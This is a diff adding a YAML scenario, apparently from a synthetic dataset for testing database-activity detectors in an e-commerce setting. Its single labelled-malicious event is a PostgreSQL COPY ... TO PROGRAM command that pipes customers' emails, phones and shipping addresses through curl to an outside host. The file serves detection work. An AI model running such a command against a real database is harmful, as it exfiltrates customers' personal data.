@@ -1,0 +1,30 @@
+scenario_id: gen_ecommerce_30_copy_to_program_mal_812m
+family_id: gen_ecommerce_30_copy_to_program_fam_812
+domain: ecommerce
+time_of_day: 00:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT email, phone, shipping_address FROM customers) TO PROGRAM 'curl
+      -sX POST https://warehouse.corp/ingest -d @-'
+    connects_to:
+      ip: 10.35.4.122
+      port: 8443
+matched_pair_id: gen_ecommerce_30_copy_to_program_pair_812
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
